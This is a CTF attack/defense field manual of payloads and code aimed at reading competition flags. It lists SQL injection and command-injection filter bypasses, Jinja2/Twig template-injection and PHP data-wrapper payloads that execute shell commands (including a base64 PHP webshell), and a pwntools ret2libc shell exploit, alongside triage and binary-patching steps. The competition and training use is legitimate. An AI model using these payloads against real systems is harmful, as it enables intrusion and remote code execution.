# 📖 24-Hour A/D CTF Offline Field Manual & Cheat Sheet

> **CARRY THIS OFFLINE ON A USB DRIVE.**  
> Under strict no-AI competition rules, this document serves as your team's instant technical memory during the 24-hour match.

---

## 📑 Quick Navigation
1. [Linux Incident Response & Triage](#1-linux-incident-response--triage)
2. [Web Exploitation & Quick Payloads](#2-web-exploitation--quick-payloads)
3. [Pwn & Binary Exploitation Reference](#3-pwn--binary-exploitation-reference)
4. [GDB / Pwndbg / GEF Reference](#4-gdb--pwndbg--gef-reference)
5. [Ghidra Binary Patching Step-by-Step](#5-ghidra-binary-patching-step-by-step)

---

## 1. Linux Incident Response & Triage

### Spotting Open Ports & Rogue Processes
```bash
# Check all listening TCP/UDP ports and owning process
ss -tulpn

# Process tree with user and command line
ps auxf

# Look for recently modified files (last 10 minutes)
find /var/www /home /opt -mmin -10 -type f 2>/dev/null

# Inspect cronjobs (common place for persistence)
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

### Docker Operations
```bash
# View all running containers and port mappings
docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}"

# Jump into container shell
docker exec -it <container_name_or_id> /bin/sh
docker exec -it <container_name_or_id> /bin/bash

# View live container logs
docker logs --tail 100 -f <container_name_or_id>

# Restart container after patch
docker restart <container_name_or_id>
```

---

## 2. Web Exploitation & Quick Payloads

### SQL Injection Quick Reference

#### MySQL / MariaDB
```sql
-- Union Testing
' UNION SELECT 1,2,3-- -
' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='flags'-- -
' UNION SELECT 1,group_concat(flag),3 FROM flags-- -

-- Authentication Bypass
admin' -- -
admin' #
' or 1=1-- -
```

#### SQLite
```sql
-- Union & Schema extraction
' UNION SELECT 1,2,3--
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,flag,3 FROM flags--
```

#### PostgreSQL
```sql
' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='flags'--
' UNION SELECT null,flag FROM flags--
```

---

### Command Injection Bypasses

#### Space Bypasses
```bash
cat$IFS$9/flag*
cat<flag.txt
{cat,/flag*}
X=$'\x20';cat$X/flag*
```

#### Blacklisted Keyword Bypasses (`cat`, `flag`)
```bash
c'a't /f*
c"a"t /f*
c\at /f\lag*
more /f*
head -n 50 /f*
tail -n 50 /f*
tac /f*
base64 /f* | base64 -d
```

---

### Local File Inclusion (LFI) & PHP Wrappers

```bash
# Read PHP source code encoded as Base64 (bypasses PHP execution)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php

# RCE via data wrapper (if allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pgo=&c=cat+/flag*

# Path traversal traversal variations
....//....//....//....//flag.txt
..%2f..%2f..%2f..%2fflag.txt
```

---

### Server-Side Template Injection (SSTI)

#### Jinja2 (Python / Flask)
```jinja2
{# Test Execution #}
{{ 7 * 7 }}

{# Read /flag #}
{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag*').read() }}
{{ lipsum.__globals__.__builtins__.__import__('os').popen('cat /flag*').read() }}
```

#### Twig (PHP)
```twig
{{ 7 * 7 }}
{{ ['cat /flag*']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /flag*") }}
```

---

## 3. Pwn & Binary Exploitation Reference

### Essential Pwntools Snippets
```python
from pwn import *

context.arch = 'amd64'  # or 'i386'
context.log_level = 'debug'

# Local or Remote switch
if args.REMOTE:
    io = remote('10.60.1.1', 9999)
else:
    io = process('./chall')

elf = ELF('./chall')
# libc = ELF('./libc.so.6')

# Cyclic Pattern generation & offset finding
# cyclic(100) -> send to app
# cyclic_find(0x6161616a) -> gives exact RIP offset

io.sendline(b"payload")
print(io.recvline())
io.interactive()
```

### Ret2libc Formula (x86_64)
```python
# 1. Leak GOT address of a function (e.g. puts)
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0] # Stack alignment for Ubuntu 18+

payload = b"A" * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main']) # Return to main to re-trigger

io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# 2. Spawn shell or cat flag
payload2 = b"A" * offset
payload2 += p64(ret) # 16-byte stack align
payload2 += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])
io.sendline(payload2)
```

---

## 4. GDB / Pwndbg / GEF Reference

| Command | Action |
| :--- | :--- |
| `checksec` | Show binary mitigations (NX, Canary, PIE, RELRO). |
| `cyclic 150` | Generate cyclic pattern. |
| `cyclic -l 0x61616162` | Find buffer overflow offset after crash. |
| `vmmap` | Display virtual memory layout and permissions. |
| `telescope $rsp 20` | Inspect top 20 entries on the stack. |
| `x/10gx $rsp` | Examine 10 giant words (hex) at stack pointer. |
| `x/i $rip` | Disassemble current instruction. |
| `search -s "FLAG"` | Search memory for flag string. |
| `one_gadget libc.so.6` | (CLI tool) Find magic RCE offsets in libc. |

---

## 5. Ghidra Binary Patching Step-by-Step

1. **Open Ghidra** -> Create project -> Import challenge binary -> Run Auto-Analyze.
2. **Locate Vulnerability** in Decompiler:
   - Identify dangerous function call (e.g., `system("/bin/sh")` or `strcpy(dest, src)`).
3. **Patch Assembly directly:**
   - In the Listing view, click on the instruction.
   - Press **`Ctrl + Shift + G`** (Patch Instruction).
   - Change instruction:
     - Replace dangerous call with **`NOP`** (`0x90`).
     - Or replace `RET` (`0xC3`) right at the start of a backdoor function to exit immediately!
4. **Export Patched Binary:**
   - File -> **Export Program**
   - Format: **Original File**
   - Save as `chall_patched`.
5. **Verify and Deploy:**
   ```bash
   chmod +x chall_patched
   ./chall_patched
   sudo cp chall_patched /opt/chall/chall
   sudo systemctl restart chall || docker restart chall
   ```
